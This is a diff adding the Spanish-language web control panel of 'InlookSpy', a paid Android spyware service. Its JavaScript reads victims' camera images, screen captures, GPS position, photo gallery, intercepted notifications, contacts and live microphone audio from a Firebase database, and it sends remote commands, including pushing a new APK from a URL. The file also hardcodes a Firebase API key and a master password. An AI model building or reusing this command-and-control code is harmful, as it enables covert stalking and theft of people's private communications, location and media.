@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>InlookSpy - Android Intelligence</title>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap');
+
+        :root {
+            --accent: #00ff88;
+            --accent-glow: rgba(0, 255, 136, 0.3);
+            --bg: #050505;
+            --card-bg: rgba(25, 25, 25, 0.9);
+            --border: rgba(255, 255, 255, 0.08);
+            --danger: #ff4444;
+        }
+
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; margin: 0; height: 100vh; overflow: hidden; display: flex; }
+
+        /* Pantalla de Bienvenida */
+        #welcome-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at center, #111, #000); z-index: 2000; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; }
+        .hero-title { font-size: 3.5em; font-weight: 800; color: var(--accent); letter-spacing: 5px; margin-bottom: 10px; text-shadow: 0 0 20px rgba(0,255,136,0.4); }
+        .plans-container { display: flex; gap: 30px; margin-top: 50px; flex-wrap: wrap; justify-content: center; }
+        .plan-card { background: var(--card-bg); border: 1px solid var(--border); padding: 40px; border-radius: 30px; width: 320px; transition: 0.3s; }
+        .plan-card:hover { border-color: var(--accent); transform: translateY(-10px); }
+        .plan-name { font-size: 1.5em; font-weight: 800; margin-bottom: 20px; color: #fff; }
+        .plan-features { font-size: 0.9em; color: #aaa; line-height: 1.8; margin-bottom: 30px; text-align: left; height: 150px; }
+        .btn-whatsapp { background: #25D366; color: #000; padding: 15px 30px; border-radius: 50px; text-decoration: none; font-weight: 800; font-size: 0.9em; display: inline-block; transition: 0.3s; cursor: pointer; border: none; }
+        .btn-whatsapp:hover { box-shadow: 0 0 20px #25D366; }
+        .btn-enter { margin-top: 60px; background: transparent; border: 1px solid #333; color: #555; padding: 10px 40px; border-radius: 50px; cursor: pointer; font-weight: 600; }
+        .btn-enter:hover { color: #fff; border-color: #fff; }
+
+        /* Sidebar lateral */
+        #sidebar { width: 280px; background: #080808; border-right: 1px solid var(--border); padding: 30px 15px; display: flex; flex-direction: column; z-index: 100; box-shadow: 15px 0 50px #000; }
+        .sidebar-title { color: var(--accent); font-size: 1.1em; font-weight: 800; letter-spacing: 2px; text-align: center; margin-bottom: 40px; text-transform: uppercase; }
+        .device-item { padding: 18px; border: 1px solid var(--border); margin-bottom: 12px; border-radius: 16px; cursor: pointer; background: rgba(255,255,255,0.02); transition: 0.3s; display: flex; align-items: center; gap: 15px; position: relative; }
+        .active-device { background: var(--accent) !important; color: #000 !important; font-weight: 800; }
+        .status-dot { width: 10px; height: 10px; border-radius: 50%; position: absolute; top: 15px; right: 15px; border: 2px solid #000; }
+        .dot-ONLINE { background: var(--accent); box-shadow: 0 0 10px var(--accent); }
+        .dot-OFFLINE { background: #444; }
+
+        /* Main Content */
+        #main-content { flex: 1; display: flex; flex-direction: column; overflow: hidden; background: #000; }
+        header { padding: 20px 40px; background: #0a0a0a; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
+
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 1.5fr 1fr 1.2fr;
+            gap: 20px; padding: 20px;
+            height: calc(100vh - 80px);
+            box-sizing: border-box;
+        }
+
+        .column { display: flex; flex-direction: column; gap: 20px; overflow: hidden; }
+        .card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 24px; display: flex; flex-direction: column; overflow: hidden; backdrop-filter: blur(15px); transition: 0.3s; flex: 1; }
+        .card-header { padding: 12px 20px; color: #888; font-weight: 700; font-size: 0.7em; text-transform: uppercase; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
+        .card-body { padding: 15px; flex: 1; overflow-y: auto; position: relative; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+
+        .live-img { max-width: 100%; max-height: 100%; object-fit: contain; }
+        .msg-row { padding: 15px; background: rgba(255,255,255,0.03); border-radius: 15px; margin-bottom: 12px; border: 1px solid var(--border); font-size: 0.85em; width: 100%; box-sizing: border-box; }
+        .msg-app { color: var(--accent); font-weight: 800; font-size: 0.65em; display: block; margin-bottom: 5px; }
+
+        #map { width: 100%; height: 180px; border-radius: 15px; filter: invert(90%) hue-rotate(180deg); }
+        .btn-icon { background: rgba(255,255,255,0.05); color: var(--accent); border: 1px solid var(--border); padding: 8px 15px; border-radius: 10px; cursor: pointer; transition: 0.3s; font-size: 0.8em; font-weight: bold; }
+        .btn-icon:hover { background: var(--accent); color: #000; }
+
+        /* Modales */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1500; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
+        .modal-content { background: #0f0f0f; width: 450px; height: 85vh; border-radius: 30px; border: 1px solid var(--border); display: flex; flex-direction: column; padding: 30px; }
+        .modal-item { padding: 15px; border-bottom: 1px solid #222; display: flex; align-items: center; gap: 15px; font-size: 0.9em; }
+        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(80px, 1fr)); gap: 10px; width: 100%; }
+        .gallery-grid img { width: 100%; aspect-ratio: 1; object-fit: cover; border-radius: 10px; border: 1px solid var(--border); }
+    </style>
+</head>
+<body>
+
+    <!-- PANTALLA DE INICIO -->
+    <div id="welcome-screen">
+        <h1 class="hero-title">INLOOKSPY</h1>
+        <p style="color: #666; letter-spacing: 2px;">SISTEMA PREMIUM DE INTELIGENCIA ANDROID</p>
+
+        <div class="plans-container">
+            <div class="plan-card">
+                <div class="plan-name">STANDARD</div>
+                <div class="plan-features">
+                    • Acceso a Cámaras (F/B)<br>
+                    • Interceptación Notificaciones<br>
+                    • Galería de Imágenes<br>
+                    • Ubicación en Tiempo Real
+                </div>
+                <a href="https://w.app/vkjymz" target="_blank" class="btn-whatsapp">CONTACTAR STANDARD</a>
+            </div>
+            <div class="plan-card" style="border-color: var(--accent);">
+                <div class="plan-name" style="color: var(--accent);">PRO</div>
+                <div class="plan-features">
+                    • Todo lo de Standard<br>
+                    • Pantalla en Vivo (Live)<br>
+                    • Audio del Sistema Interno<br>
+                    • Micrófono Ambiental 24/7<br>
+                    • Agenda de Contactos Full
+                </div>
+                <a href="https://w.app/vkjymz" target="_blank" class="btn-whatsapp">CONTACTAR PRO</a>
+            </div>
+        </div>
+
+        <button class="btn-enter" onclick="checkConsoleAccess()">ENTRAR A CONSOLA</button>
+    </div>
+
+    <div id="sidebar">
+        <div class="sidebar-title">Spy Command</div>
+        <div id="device-list">Escaneando señales...</div>
+    </div>
+
+    <div id="main-content">
+        <header>
+            <div id="current-device-name" style="font-weight: 800; color: var(--accent);">SELECCIONE TERMINAL</div>
+            <div id="header-actions" style="display: none; gap: 10px;">
+                <button class="btn-icon" onclick="openModal('calls-modal')"><i class="fas fa-phone-alt"></i> LLAMADAS</button>
+                <button class="btn-icon" onclick="openModal('contacts-modal')"><i class="fas fa-address-book"></i> AGENDA</button>
+                <button class="btn-icon" style="color:var(--danger);" onclick="deleteDevice()"><i class="fas fa-trash"></i></button>
+            </div>
+        </header>
+
+        <div id="dashboard-ui" class="dashboard-grid" style="display:none;">
+            <div class="column">
+                <div class="card" style="flex: 1.6;">
+                    <div class="card-header">Video Pantalla <div><button id="btn-int-audio" class="btn-icon" onclick="toggleInternalAudio()"><i class="fas fa-volume-up"></i></button><button class="btn-icon" style="background:var(--accent); color:#000; margin-left:10px;" onclick="sendCmd('SCREEN_START')">ON</button></div></div>
+                    <div class="card-body"><img id="screen-view" class="live-img"></div>
+                </div>
+                <div class="card">
+                    <div class="card-header">Cámara Remota <div><button class="btn-icon" onclick="sendCam('START_BACK')">BACK</button><button class="btn-icon" onclick="sendCam('START_FRONT')">FRONT</button></div></div>
+                    <div class="card-body">
+                        <div id="camera-busy" style="display:none; position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:10; flex-direction:column; align-items:center; justify-content:center; color:var(--danger); font-weight:bold;"><i class="fas fa-video-slash" style="font-size:30px;"></i> CÁMARA OCUPADA</div>
+                        <img id="camera-view" class="live-img">
+                    </div>
+                </div>
+            </div>
+
+            <div class="card"><div class="card-header">Interceptación de Mensajes</div><div class="card-body" id="notif-list" style="display:block; padding:0;"></div></div>
+
+            <div class="column">
+                <div class="card" style="flex: 0 0 auto;"><div class="card-header">Localización GPS</div><div class="card-body" style="padding:0;"><div id="map"></div></div></div>
+                <div class="card"><div class="card-header">Galería Realtime <button class="btn-icon" onclick="sendCmd('SYNC_GALLERY')"><i class="fas fa-sync"></i></button></div><div class="card-body" style="display:block;"><div id="gallery-grid" class="gallery-grid"></div></div></div>
+                <button id="btn-mic-audio" class="btn-icon" style="background:var(--accent); color:#000; padding:15px; border-radius:15px;" onclick="toggleMicAudio()"><i class="fas fa-microphone"></i> ESCUCHAR ENTORNO</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODALES -->
+    <div id="contacts-modal" class="modal"><div class="modal-content"><div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;"><h3>Agenda</h3><button onclick="closeModal('contacts-modal')" style="background:none; border:none; color:#fff; font-size:2em;">&times;</button></div><div id="modal-contacts-list" style="overflow-y:auto; flex:1;"></div></div></div>
+    <div id="calls-modal" class="modal"><div class="modal-content"><div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;"><h3>Historial</h3><button onclick="closeModal('calls-modal')" style="background:none; border:none; color:#fff; font-size:2em;">&times;</button></div><div id="modal-calls-list" style="overflow-y:auto; flex:1;"></div></div></div>
+
+    <script>
+        const firebaseConfig = { apiKey: "AIzaSyCZuuTlWtW20G9ksqMxB5Z_I9U0GIlNoMc", authDomain: "credipay-3d6dc.firebaseapp.com", databaseURL: "https://credipay-3d6dc-default-rtdb.firebaseio.com", projectId: "credipay-3d6dc", storageBucket: "credipay-3d6dc.appspot.com" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        let currentId = "", audioCtx, map, marker, activeRefs = [];
+        let micRef, intRef, nextMicTime = 0, nextIntTime = 0, micActive = false, intActive = false;
+
+        function checkConsoleAccess() {
+            const pass = prompt("Ingrese la clave maestra para entrar a la consola:");
+            if (pass === "Inlook2024") {
+                document.getElementById('welcome-screen').style.display = 'none';
+            } else {
+                alert("Acceso denegado. Clave incorrecta.");
+            }
+        }
+
+        db.ref('device_list').on('value', snap => {
+            const list = document.getElementById('device-list'); list.innerHTML = "";
+            const devices = snap.val(); if (devices) { for (let id in devices) {
+                const div = document.createElement('div'); div.className = 'device-item' + (id === currentId ? ' active-device' : '');
+                div.innerHTML = `<i class="fas fa-shield-alt"></i> <b>${devices[id]}</b><div id="dot-${id}" class="status-dot dot-OFFLINE"></div>`;
+                div.onclick = () => connectToDevice(id, devices[id]); list.appendChild(div);
+                db.ref(`devices/${id}/status`).on('value', s => { if(document.getElementById(`dot-${id}`)) document.getElementById(`dot-${id}`).className = "status-dot dot-" + (s.val() || "OFFLINE"); });
+            }}
+        });
+
+        function connectToDevice(id, name) {
+            if (activeRefs.length > 0) { activeRefs.forEach(r => r.off()); activeRefs = []; }
+            if (micRef) micRef.off(); if (intRef) intRef.off();
+            micActive = false; intActive = false; updateAudioButtons();
+
+            currentId = id; document.getElementById('dashboard-ui').style.display = "grid";
+            document.getElementById('header-actions').style.display = "flex";
+            document.getElementById('current-device-name').innerText = name.toUpperCase();
+            if (!map) { map = L.map('map').setView([0, 0], 2); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map); marker = L.marker([0, 0]).addTo(map); }
+
+            document.getElementById('gallery-grid').innerHTML = ""; document.getElementById('notif-list').innerHTML = "";
+            document.getElementById('camera-view').src = ""; document.getElementById('screen-view').src = "";
+
+            db.ref(`devices/${id}/camera`).on('value', s => { if (s.val()) document.getElementById('camera-view').src = "data:image/jpeg;base64," + s.val(); });
+            db.ref(`devices/${id}/screen`).on('value', s => { if (s.val()) document.getElementById('screen-view').src = "data:image/jpeg;base64," + s.val(); });
+            db.ref(`devices/${id}/location`).on('value', s => { if (s.val()) { let pos = [s.val().lat, s.val().lng]; marker.setLatLng(pos); map.setView(pos, 15); } });
+            db.ref(`devices/${id}/gallery`).limitToLast(20).on('child_added', s => { let img = document.createElement('img'); img.src = "data:image/jpeg;base64," + s.val(); img.onclick = () => window.open(img.src); document.getElementById('gallery-grid').prepend(img); });
+
+            db.ref(`devices/${id}/notifications`).limitToLast(30).on('child_added', s => {
+                let n = s.val(); let t = new Date(n.time).toLocaleTimeString();
+                const row = document.createElement('div'); row.className = 'msg-row';
+                row.innerHTML = `<span style="float:right; opacity:0.3; font-size:0.8em;">${t}</span><span class="msg-app">${n.app.split('.').pop()}</span><b>${n.title}</b><br>${n.text}`;
+                document.getElementById('notif-list').prepend(row);
+            });
+
+            db.ref(`devices/${id}/contacts`).on('value', s => {
+                const list = document.getElementById('modal-contacts-list'); list.innerHTML = "";
+                if (s.val()) s.val().forEach(c => list.innerHTML += `<div class="modal-item"><i class="fas fa-user-circle"></i> <div><b>${c.name}</b><br><small>${c.phone}</small></div></div>`);
+            });
+        }
+
+        function initAudio() { if (!audioCtx) audioCtx = new AudioContext(); if (audioCtx.state === 'suspended') audioCtx.resume(); }
+        function toggleMicAudio() { initAudio(); micActive = !micActive; updateAudioButtons(); db.ref(`devices/${currentId}/mic_cmd`).set(micActive ? "START_" + Date.now() : "STOP_" + Date.now()); if (micRef) micRef.off(); if (micActive) { micRef = db.ref(`devices/${currentId}/audio`); micRef.on('value', snap => playAudio(snap.val(), true)); } }
+        function toggleInternalAudio() { initAudio(); internalActive = !internalActive; updateAudioButtons(); db.ref(`devices/${currentId}/internal_audio_cmd`).set(intActive ? "START_" + Date.now() : "STOP_" + Date.now()); if (intRef) intRef.off(); if (intActive) { intRef = db.ref(`devices/${currentId}/internal_audio`); intRef.on('value', snap => playAudio(snap.val(), false)); } }
+        function updateAudioButtons() {
+            const micBtn = document.getElementById('btn-mic-audio');
+            const intBtn = document.getElementById('btn-int-audio');
+            if (micBtn) { micBtn.innerHTML = micActive ? '<i class="fas fa-stop-circle"></i> SILENCIAR' : '<i class="fas fa-microphone"></i> ESCUCHAR ENTORNO'; micBtn.style.background = micActive ? '#ff4444' : 'var(--accent)'; }
+            if (intBtn) intBtn.classList.toggle('active', intActive);
+        }
+        function playAudio(base64, isMic) {
+            if (!base64 || !audioCtx) return;
+            const binary = window.atob(base64); const bytes = new Int16Array(binary.length / 2);
+            for (let i = 0; i < binary.length; i += 2) bytes[i / 2] = (binary.charCodeAt(i + 1) << 8) | binary.charCodeAt(i);
+            const buffer = audioCtx.createBuffer(1, bytes.length, 16000); buffer.getChannelData(0).set(Array.from(bytes).map(v => v / 32768));
+            const source = audioCtx.createBufferSource(); source.buffer = buffer; source.connect(audioCtx.destination);
+            let time = isMic ? nextMicTime : nextIntTime; if (time < audioCtx.currentTime) time = audioCtx.currentTime;
+            source.start(time); if (isMic) nextMicTime = time + buffer.duration; else nextIntTime = time + buffer.duration;
+        }
+        function openModal(id) { document.getElementById(id).style.display = "flex"; }
+        function closeModal(id) { document.getElementById(id).style.display = "none"; }
+        function sendCam(cmd) { if(currentId) db.ref(`devices/${currentId}/cam_cmd`).set(cmd + "_" + Date.now()); }
+        function sendCmd(cmd) { if(currentId) db.ref(`devices/${currentId}/main_cmd`).set(cmd + "_" + Date.now()); }
+        function deleteDevice() { if(confirm("¿Eliminar?")) { db.ref(`devices/${currentId}`).remove(); db.ref(`device_list/${currentId}`).remove(); location.reload(); } }
+        function updateSoftware() { const url = prompt("Link del APK:"); if(url) sendCmd("UPDATE_APP_" + url); }
+    </script>
+</body>
+</html>
